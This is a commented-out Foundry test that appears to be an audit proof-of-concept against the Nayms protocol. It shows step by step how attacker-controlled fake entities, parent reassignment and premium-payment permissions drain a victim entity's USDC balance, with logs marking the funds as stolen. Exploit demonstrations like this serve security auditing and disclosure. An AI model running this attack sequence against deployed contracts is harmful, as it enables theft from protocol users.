// // SPDX-License-Identifier: MIT
// pragma solidity 0.8.20;

// import { D03ProtocolDefaults, c, LC, Entity } from "./defaults/D03ProtocolDefaults.sol";

// //Add this test function
// /*
// // initPolicyWithLimitAndAssetAndAttacker should be  in the D03ProtocolDefaults.sol

//   function initPolicyWithLimitAndAssetAndAttacker(uint256 limitAmount, bytes32 assetId,NaymsAccount memory acc,NaymsAccount memory attacker)
//     internal
//     view
//     returns (Stakeholders memory policyStakeholders, SimplePolicy memory policy)
//     {
//         bytes32[] memory roles = new bytes32[](1);
//         roles[0] = LibHelpers._stringToBytes32(LC.GROUP_PAY_SIMPLE_PREMIUM);
//         bytes32[] memory entityIds = new bytes32[](1);
//         entityIds[0] = attacker.id;
//         {
//             bytes32[] memory commissionReceivers = new bytes32[](1);
//             commissionReceivers[0]= acc.entityId;
//             uint256[] memory commissions = new uint256[](1);
//             commissions[0] = 0;
//             policy.startDate = block.timestamp + 1000;
//             policy.maturationDate = block.timestamp + 1000 + 2 days;
//             policy.asset = assetId;
//             policy.limit = limitAmount;
//             policy.commissionReceivers = commissionReceivers;
//             policy.commissionBasisPoints = commissions;
//         }

//         {
//             bytes[] memory signatures = new bytes[](1);
//             bytes32 signingHash = nayms.getSigningHash(
//                 policy.startDate, policy.maturationDate, policy.asset, policy.limit, "offchain"
//             );

//             signatures[0]= initPolicySig(acc.pk,signingHash);
//             //0xbb51ae847295104088b45a86e9ceb7dfabec7268e84a64243dfa8e653bc624db pk for attacker Backup


//             policyStakeholders = Stakeholders(roles, entityIds, signatures);
//         }
//     }
// */
// contract T99 is D03ProtocolDefaults {
//     function testAttackWithFakeEntity() public {
//         // attacker will make entity and start a policy
//         vm.stopPrank();
//         vm.startPrank(sa.addr);

//         nayms.addSupportedExternalToken(usdcAddress);
//         changePrank(sm.addr);
//         Entity memory entityData = Entity({ assetId: usdcId, collateralRatio: 10_000, maxCapacity: 1_000_000e6, utilizedCapacity: 0, simplePolicyEnabled: true });
//         Entity memory entityFake = Entity({ assetId: usdcId, collateralRatio: 10_000, maxCapacity: 1_0006, utilizedCapacity: 0, simplePolicyEnabled: false });
//         uint256 usdc1m = 1_000_000;

//         NaymsAccount memory entityVictim = makeNaymsAcc("entityVictims");

//         NaymsAccount memory attackerFakeEntity = makeNaymsAcc("attackersFakes");
//         NaymsAccount memory attackerRealEntity = makeNaymsAcc("attackerReals");
//         NaymsAccount memory attackerBackupAccount = makeNaymsAcc("attackerBackUps");
//         hCreateEntity(attackerRealEntity.entityId, attackerRealEntity.id, entityData, "attackerReals");
//         hCreateEntity(attackerFakeEntity.entityId, entityVictim.id, entityFake, "attackersFakes");
//         hCreateEntity(attackerFakeEntity.id, entityVictim.id, entityFake, "attackersFakesId");
//         hCreateEntity(entityVictim.entityId, entityVictim.id, entityData, "entityVictims");
//         hCreateEntity(attackerBackupAccount.entityId, attackerFakeEntity.id, entityData, "attackerBackUps");
//         // @attack  million is chosen since its impact in the contract but it can be any token as long as it has internalBalance  and policy can be created for it to work
//         fundEntityUsdc(entityVictim, 1_000_000e6);
//         //@attack funds can be flashloaned to make the  attack cheaper
//         fundEntityUsdc(attackerRealEntity, 1_000_000e6);
//         uint256 internalBalance = nayms.internalBalanceOf(entityVictim.entityId, usdcId);
//         c.log("victim balance before the attack", internalBalance);
//         internalBalance = nayms.internalBalanceOf(attackerRealEntity.entityId, usdcId);
//         c.log("attacker balance before the attack", internalBalance);
//         vm.stopPrank();
//         vm.startPrank(sm.addr);
//         // setting the parent @note the parent dosnt have to be done in the same tx as the attack
//         nayms.setEntity(attackerBackupAccount.id, attackerFakeEntity.id);
//         vm.stopPrank();
//         vm.startPrank(sa.addr);
//         // admin dosnt know of the attack yet since it can another transaction a way and its regular action
//         nayms.updateRoleAssigner(LC.GROUP_PAY_SIMPLE_PREMIUM, LC.GROUP_PAY_SIMPLE_PREMIUM);
//         nayms.updateRoleGroup(LC.GROUP_PAY_SIMPLE_PREMIUM, LC.GROUP_PAY_SIMPLE_PREMIUM, true);
//         // now we are going to create a policy for the attacker then we can drain the victim
//         uint256 policyLimit = usdc1m;
//         (Stakeholders memory stakeHolders, SimplePolicy memory simplePolicy) = initPolicyWithLimitAndAssetAndAttacker(
//             policyLimit,
//             usdcId,
//             attackerBackupAccount,
//             attackerFakeEntity
//         );
//         vm.startPrank(su.addr);
//         nayms.createSimplePolicy(bytes32("1"), attackerRealEntity.entityId, stakeHolders, simplePolicy, "offchain");
//         // now the attacker is going to drain the internal balance of usdc from the victim
//         vm.startPrank(sm.addr);
//         // @note this can be done not in the attack but is benifical or if its the biggest account
//         nayms.setEntity(attackerFakeEntity.id, entityVictim.entityId);
//         vm.startPrank(attackerFakeEntity.addr);
//         nayms.paySimplePremium(bytes32("1"), 1_000_000e6);
//         internalBalance = nayms.internalBalanceOf(entityVictim.entityId, usdcId);
//         require(internalBalance == 0);
//         c.log(internalBalance, "victim balance After the attack");
//         internalBalance = nayms.internalBalanceOf(attackerRealEntity.entityId, usdcId);
//         c.log(internalBalance, "attacker balance after the attack");
//         // Now the attacker will withdraw since they will have no problems withdraws since its real entity and owned by the attacker
//         vm.startPrank(su.addr);
//         // @note attacker cancels their policy to  get all their funds back
//         nayms.cancelSimplePolicy(bytes32("1"));
//         vm.startPrank(attackerRealEntity.addr);
//         // we take all funds in the contract
//         nayms.externalWithdrawFromEntity(attackerRealEntity.entityId, attackerRealEntity.addr, address(usdc), internalBalance);
//         c.log(usdc.balanceOf(attackerRealEntity.addr), "funds stolen and limit!!!");
//     }
// }
